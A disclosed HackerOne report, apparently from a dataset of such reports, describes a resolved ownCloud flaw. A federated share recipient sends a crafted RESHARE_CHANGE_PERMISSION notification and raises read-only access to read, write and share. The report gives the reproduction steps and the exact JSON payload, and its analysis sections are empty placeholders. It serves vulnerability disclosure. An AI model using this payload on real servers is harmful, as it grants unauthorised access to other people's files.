---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1990443'
original_report_id: '1990443'
title: Federated share permissions can be increased by recipient
team_handle: owncloud
created_at: '2023-05-17T08:52:57.748Z'
disclosed_at: '2023-06-24T08:28:41.084Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 27
asset_identifier: owncloud/core
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
---

# Federated share permissions can be increased by recipient

## Metadata

- HackerOne Report ID: 1990443
- Weakness: 
- Program: owncloud
- Disclosed At: 2023-06-24T08:28:41.084Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1. userA on serverX does a federated share to userB on serverY (this by default is read only)
2. userB accepts the share
3. userB does a request to

```https://SERVERY/apps/federatedfilesharing/notifications```

With the content. Replacing the SHARE_TOKEN, and the SHARE_ID they find in their database

```
{
    "notificationType": "RESHARE_CHANGE_PERMISSION",
    "resourceType": "file",
    "providerId": "SHARE_ID",
    "notification": {
        "sharedSecret": "SHARE_TOKEN",
        "permission": ["read", "write", "share"]
    }
}
```

4. userB now has full access

## Impact

A recipient can increase their permissions trivially

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
